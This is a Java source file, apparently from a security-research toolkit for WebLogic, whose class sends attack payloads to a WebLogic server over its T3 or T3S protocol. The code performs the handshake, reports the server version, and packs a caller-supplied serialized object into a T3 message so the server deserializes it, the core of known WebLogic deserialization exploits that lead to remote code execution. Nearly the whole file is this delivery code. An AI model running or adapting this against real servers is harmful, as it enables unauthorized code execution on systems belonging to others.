package com.pinger.javasec.util.weblogic.protocol;


import com.pinger.javasec.util.weblogic.serial.BytesOperation;
import com.pinger.javasec.util.weblogic.serial.Serializables;
import com.pinger.javasec.util.weblogic.ssl.SocketFactory;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.Socket;


/**
 * 利用T3协议发送payload的工具类
 */
public class T3ProtocolOperation {


    public static void send(String host, String port, byte[] payload,Boolean isHttps) throws Exception {
        Socket s = SocketFactory.newSocket(host, Integer.parseInt(port),isHttps);
        //AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的
        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";

        if (isHttps) {
            header = "t3s 7.0.0.0\nAS:10\nHL:19\n\n";
        }

        s.getOutputStream().write(header.getBytes());
        s.getOutputStream().flush();
        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        String versionInfo = br.readLine();
        versionInfo = versionInfo.replace("HELO:", "");
        versionInfo = versionInfo.replace(".false", "");
        System.out.println("weblogic version:" + versionInfo);
//        String asInfo = br.readLine();
//        String hlInfo = br.readLine();
//        System.out.println(versionInfo+"\n"+asInfo+"\n"+hlInfo);

        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1

        //t3 protocol
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//必须大于上面设置的AS值
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = BytesOperation.bytesToHexString(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        //for compatiable fo hide
        //for compatiable fo hide
        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "admin123");
        String phase4 = BytesOperation.bytesToHexString(Serializables.serialize(authenticatedUser));
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(phase4);

        JVMID src = new JVMID();

        Constructor constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        Field serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(src,1);

        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(src)));

        JVMID dst = new JVMID();

        constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(dst,1);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(dst)));

        byte[] headers = BytesOperation.hexStringToBytes(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            for (int i = 0; i < (8 - hexLen.length()); i++) {
                dataLen.append("0");
            }
        }

        dataLen.append(hexLen);
        s.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + datas.toString()));
        s.getOutputStream().flush();
        s.close();

    }

}
